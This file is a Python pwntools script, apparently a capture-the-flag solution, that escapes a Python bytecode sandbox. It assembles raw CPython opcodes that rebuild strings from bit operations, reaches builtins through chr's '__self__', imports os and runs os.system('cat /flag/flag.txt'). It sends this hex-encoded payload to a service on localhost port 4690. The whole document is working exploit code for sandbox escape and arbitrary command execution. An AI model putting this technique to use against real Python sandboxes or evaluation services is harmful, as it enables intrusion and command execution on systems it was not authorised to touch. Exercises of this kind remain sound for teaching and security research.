import dis
from pwn import *


def opcodes_for_chr(c: str):
    return (
        [
            ("LOAD_CONST", 1),
        ]
        + opcodes_for_int(ord(c))
        + [("CALL_FUNCTION", 1)]
    )


def opcodes_for_int(n):
    binary_n = "{:08b}".format(n)
    instructions = [
        ("LOAD_CONST", 0),
        ("UNARY_NOT",),
    ]
    for i in range(1, len(binary_n)):
        instructions += [("LOAD_CONST", 0), ("BINARY_LSHIFT",)]
        if binary_n[i] == "1":
            instructions += [("LOAD_CONST", 0), ("BINARY_OR",)]
    return instructions


def opcodes_for_string(text: str):
    letter_instr = []
    for c in text:
        letter_instr += opcodes_for_chr(c)
    letter_instr += [("BUILD_STRING", len(text))]
    return letter_instr


def create_bytecode(opcodes):
    code = []
    for opcode in opcodes:
        name, arg = opcode if len(opcode) == 2 else (opcode[0], 0)
        opcode_value = dis.opmap[name]
        code += [opcode_value, arg]
    return bytes(code)


opcodes = (
    [
        ("LOAD_CONST", 2),  # getattr
        ("LOAD_CONST", 1),  # chr
    ]
    + opcodes_for_string("__self__")
    + [
        ("CALL_FUNCTION", 2),
    ]
    + [("LOAD_CONST", 2), ("ROT_TWO",)]
    + opcodes_for_string("__import__")
    + [("CALL_FUNCTION", 2)]
    + opcodes_for_string("os")
    + [("CALL_FUNCTION", 1)]
    + [("LOAD_CONST", 2), ("ROT_TWO",)]
    + opcodes_for_string("system")
    + [("CALL_FUNCTION", 2)]
    + opcodes_for_string("cat /flag/flag.txt")
    + [("CALL_FUNCTION", 1)]
    + [("RETURN_VALUE",)]
)

byte_string = create_bytecode(opcodes)
payload = "".join(f"{b:02x}" for b in byte_string)

HOST = "localhost"
PORT = 4690

io = remote(HOST, PORT)
io.sendline(payload)
io.interactive()
